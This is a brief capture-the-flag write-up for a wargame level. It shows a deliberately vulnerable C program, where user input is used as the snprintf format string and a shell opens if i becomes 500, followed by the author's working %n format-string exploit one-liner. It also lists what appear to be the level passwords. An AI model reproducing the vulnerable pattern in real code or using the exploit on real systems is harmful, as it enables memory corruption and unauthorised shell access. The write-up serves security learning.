Previous key: faimahchiy

/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
int main(int argc, char **argv){
	int i = 1;
	char buffer[64];

	snprintf(buffer, sizeof buffer, argv[1]);
	buffer[sizeof (buffer) - 1] = 0;
	printf("Change i's value from 1 -> 500. ");

	if(i==500){
		printf("GOOD\n");
		system("/bin/sh");
	}

	printf("No way...let me give you a hint!\n");
	printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
	printf ("i = %d (%p)\n", i, &i);
	return 0;
}

Oh sweet! The system call is there already.

So this is gonna by a format string exploit

./narnia5 %p%p%p%p%p does about what I'd expect.

I had a pretty good idea of the general format of this exploitation and since it gave me the address of i, I was able to use the following:

./narnia5 `python -c "print '\x0c\xd7\xff\xff' + '%08x.'*8 + '%n'"`

To make it modify some data. Changing the numbers around, the solution was:
./narnia5 `python -c "print '\x0c\xd7\xff\xff' + '%61x.'*8 + '%n'"`

neezocaeng